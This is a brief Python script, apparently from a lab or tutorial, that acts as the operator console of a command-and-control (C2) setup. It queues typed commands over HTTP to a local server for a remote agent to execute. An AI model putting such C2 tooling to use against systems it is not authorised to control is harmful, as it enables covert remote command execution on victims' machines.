import requests
import json

SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = "agent_001"

def main():
    print(f"--- C2 Operator Console: {AGENT_ID} ---")
    print("Type 'exit' to quit. Type your command to queue it for the agent.")
    
    while True:
        # Get user input
        command = input(f"\n[{AGENT_ID}] > ")
        
        if command.lower() == 'exit':
            break
        
        if not command.strip():
            continue

        # Wrap the command in a JSON payload
        payload = {"command": command}
        
        try:
            # Send the command to the server's /set_task endpoint
            response = requests.post(
                f"{SERVER_URL}/set_task/{AGENT_ID}", 
                json=payload
            )
            
            if response.status_code == 200:
                print(f"[+] Task '{command}' successfully queued.")
                print(f"[*] The agent will pick this up on its next check-in.")
            else:
                print(f"[-] Server returned error: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print("[-] Error: Could not connect to the C2 Server")

if __name__ == "__main__":
    main()